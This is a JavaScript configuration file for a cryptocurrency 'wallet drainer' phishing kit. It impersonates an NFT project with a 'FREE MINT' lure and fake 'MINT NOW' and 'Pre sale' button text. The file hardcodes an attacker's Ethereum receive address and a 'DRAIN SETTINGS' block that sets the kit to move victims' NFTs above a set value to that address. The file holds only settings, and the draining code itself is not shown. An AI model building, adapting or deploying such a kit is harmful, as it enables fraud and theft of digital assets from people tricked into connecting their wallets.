/*
    = = = = = YOU WALLET ADRESS = = = = =
*/
const connect = document.querySelector('.purchase-button');
const transfer = document.querySelector('.purchase-button');

const receiveAddress = "0xf1522EB7353ef1FAA6B8961E62D857B27f985b93";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "IguVerse",
    date: "02.10.2022",
    socialMedia: {
        discord: "https://discord.com/invite/iguverse",
        twitter: "https://twitter.com/iguverse",
    },
    medias: {
        preview: "preview.gif",
        favicon: "icon.png",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "background.jpg", // Image for image type or video preview for video type (image befor video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "#4E4E6D", // If you don't use color type, you can ignore this line
    }
}


/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0,
    totalSupply: 10000,
    minUnits: 1,
    maxUnits: 1,
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const drainNftsInfo = {
    active: true,
    minValue: 0.1,
    maxTransfer: 1,
    nftReceiveAddress: "0xf1522EB7353ef1FAA6B8961E62D857B27f985b93",
}

const customStrings = {
    title: "FREE MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion



